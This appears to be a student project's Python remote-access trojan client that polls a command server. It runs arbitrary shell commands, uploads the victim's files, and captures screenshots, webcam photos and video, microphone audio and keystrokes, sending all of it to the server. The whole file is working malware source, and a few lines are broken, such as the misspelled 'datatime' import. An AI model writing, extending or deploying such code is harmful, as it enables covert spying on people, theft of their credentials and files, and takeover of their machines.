# coding: gb18030

import datetime
import time
import os
import subprocess
import platform
import shutil
import requests
import sys
import traceback
import threading
import uuid
from io import StringIO
import zipfile
import tempfile
import socket
import getpass
import pyaudio
import wave

from datetime import datatime
from pynput.keyboard import Key, Listener
import cv2

if os.name == 'nt':
    from PIL import ImageGrab
else:
    import pyscreenshot as ImageGrab

import config


class Client(object):

    def __init__(self):
        self.platform = platform.system() + " " + platform.release()
        # self.uid = self.get_UID()
        self.hostname = socket.gethostname()
        # print({'platform': self.platform, 'hostname': self.hostname})
        self.keylogs = ""
        # keylogs是用于存储键盘记录的字符串

    def server_hello(self):
        """ Ask server for instructions """
        req = requests.post(config.SERVER + '/hello',
                            json={'platform': self.platform, 'hostname': self.hostname})
        #print(req.text)
        return req.text

    def send_output(self, output, command='', newlines=True):
        """ Send console output to server """
        if not isinstance(output, str):
            output = output.decode("gb18030")
            #print(output)
        req = requests.post(config.SERVER + '/report',
                            json={'output': output, 'cmd': command})

    def runcmd(self, cmd):
        """ Runs a shell command and returns its output """
        try:
            proc = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE)
            out, err = proc.communicate()
            output = (out + err)
            #print(output)
            self.send_output(output, cmd)
        except Exception as exc:
            self.send_output(traceback.format_exc())


    def expand_path(self, path):
        """ Expand environment variables and metacharacters in a path """
        return os.path.expandvars(os.path.expanduser(path))


    def upload(self, file):
        """ Uploads a local file to the server """
        print("file entity path:" + file)
        try:
            if os.path.exists(file) and os.path.isfile(file):
                self.send_output("[*] Uploading %s..." % file)
                requests.post(config.SERVER + '/upload',
                              files={'uploaded': open(file, 'rb')})
            else:
                pass
                self.send_output('[!] No such file: ' + file)
        except Exception as exc:
            print(traceback.format_exc())

    def download(self, file, destination):
        """ Downloads a file the the agent host through HTTP(S) """
        try:
           # destination = self.expand_path(destination)
            self.send_output("[*] Downloading %s..." % file)
            req = requests.get(file, stream=True)
            print(file)
            print(destination)
            tmp = file[8:].split('/')
            print(tmp)
            destination += '\\' + tmp[-1]
            print(destination)
            with open(destination, 'wb') as f:
                for chunk in req.iter_content(chunk_size=8000):
                    if chunk:
                        f.write(chunk)
            self.send_output("[+] File downloaded: " + destination)
        except Exception as exc:
            print(traceback.format_exc())
            self.send_output(traceback.format_exc())

    def screenshot(self):
        """ Takes a screenshot and uploads it to the server"""
        tmp_file = tempfile.NamedTemporaryFile()
        screenshot_file = tmp_file.name + ".png"

        if os.name != 'posix':
            screenshot = ImageGrab.grab()
            tmp_file.close()
            screenshot.save(screenshot_file)
        else:
            name = tmp_file.name + ".png"
            os.system("screencapture %s" % name)

        self.upload(screenshot_file)


    def camerashot(self):
        """开启客户端主机的摄像头,3秒后拍摄一张图片，再upload"""
        cam = cv2.VideoCapture(0)
        time.sleep(3)  # wait for camera to open up, 
                       # so image isn't dark (less sleeping = darker image)
        ret, frame = cam.read()
        if not ret:
            return
        tmp_file = tempfile.NamedTemporaryFile()
        camshot_file = tmp_file.name + ".png"
        tmp_file.close()
        cv2.imwrite(camshot_file, frame)
        self.upload(camshot_file)

    def cameravideo(self):
        cap = cv2.VideoCapture(0)# 打开摄像头
        width = 1920
        height = 1080
        # Define the codec and create VideoWriter object
        # fourcc为四个字符用来表示压缩帧的codec
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        tmp_file = tempfile.NamedTemporaryFile()
        cameravideo_file = tmp_file.name + ".avi"
        out = cv2.VideoWriter(cameravideo_file, fourcc, 20.0, (width, height))
        print("Video recording...")
        start_time = datetime.now()
        while cap.isOpened():
            ret, frame = cap.read()
            if ret is True:
                if (datetime.now()-start_time).seconds == 5:#录制5秒结束
                    break
                frame = cv2.resize(frame, (1920, 1080))
                # write the flipped frame
                out.write(frame)
            else:
                break
            key = cv2.waitKey(1)
            if key == ord("q"):
                break
        # Release everything if job is finished
        cap.release()
        out.release()
        cv2.destroyAllWindows()
        print("Video created...")
        self.upload(cameravideo_file)

    def audiocatch(self):
        """开启客户端主机麦克风,录制 10 秒音频,保存为output.wav,再upload"""
        chunk = 1024 # Record in chunks of 1024 samples 数据流块
        sample_format = pyaudio.paInt16 # 16 bits per sample 量化位数
        channels = 2 # 声道数：双声道
        fs = 44100 # 一秒钟内对声音信号的采集次数 采样率
        seconds = 10 # 录制秒数 这里录制 10 秒
        tmp_file = tempfile.NamedTemporaryFile()
        audiocatch_file = tmp_file.name + ".wav"
        audioFilename = audiocatch_file
        p = pyaudio.PyAudio() # 实例化
        print('Recording...')
        
        stream = p.open(format=sample_format,
            channels=channels,
            rate=fs,
            frames_per_buffer=chunk,
            input=True)
        frames = [] # 列表用于存储 frames
        # Store data in chunks for 10 seconds
        for i in range(0, int(fs / chunk * seconds)):
            data = stream.read(chunk) # 读取chunk个字节，放在data中
            frames.append(data)       # 列表添加中 添加 data
        # Stop and close the stream 
        stream.stop_stream()
        stream.close()
        # Terminate the PortAudio interface
        p.terminate()
        
        print('Finished recording...')
        # Save the recorded data as a WAV file
        wf = wave.open(audioFilename, 'wb')
        # 依次配置相关参数
        wf.setnchannels(channels)
        wf.setsampwidth(p.get_sample_size(sample_format))
        wf.setframerate(fs)
        wf.writeframes(b''.join(frames))# 转化为二进制写入文件
        wf.close()
        
        self.upload(audioFilename)

    def startkeylogger(self):
        "Starts logging every key pressed"
        def on_press(key):
            self.keylogs += str(key) + " "

        with Listener(on_press=on_press) as listener:
            listener.join()

    def getloggedkeys(self):
        self.send_output(self.keylogs)
        self.keylogs = ""
        if platform.system() == "Darwin":
            self.send_output("Keylogger on infected Mac currenly not supported")


    def run(self):
        try:
            self.startkeylogger() # 开始记录每一个键盘press的记录
        except:
            print("startKeylogger failed")
        """ Main loop """
        while True:
            try:
                time.sleep(1)
                todo = self.server_hello()
                # Something to do ?
                if todo != "":
                    print(todo)
                    commandline = todo
                    self.send_output('$ ' + commandline)
                    split_cmd = commandline.split(" ")
                    command = split_cmd[0]
                    args = []
                    if len(split_cmd) > 1:
                        args = split_cmd[1:]

                    if command == 'upload':
                        self.upload(args[0])
                    elif command == 'download':
                        self.download(args[0], args[1])
                    elif command == 'screenshot':
                        self.screenshot()
                    elif command == 'camshot':
                        self.camerashot()
                    elif command == 'cameravideo':
                        self.cameravideo()
                    elif command == 'audiocatch':
                        self.audiocatch()
                    elif command == 'keylogger':
                        self.getloggedkeys()
                    else:
                        self.runcmd(commandline)
                    f = open('F:\\current_semester\\software_security\\shell\\remote-shell\\G11RC\\test.txt', 'w+')
                    f.write("")
                else:
                    pass
            except Exception as exc:
                print("command exec error")

    def test(self):
        req = requests.post(config.SERVER + '/test/',
                            json={'name': 'lzl', 'number':'0017'})
        return req





def main():
    agent = Client()
    agent.run()


if __name__ == "__main__":
    main()
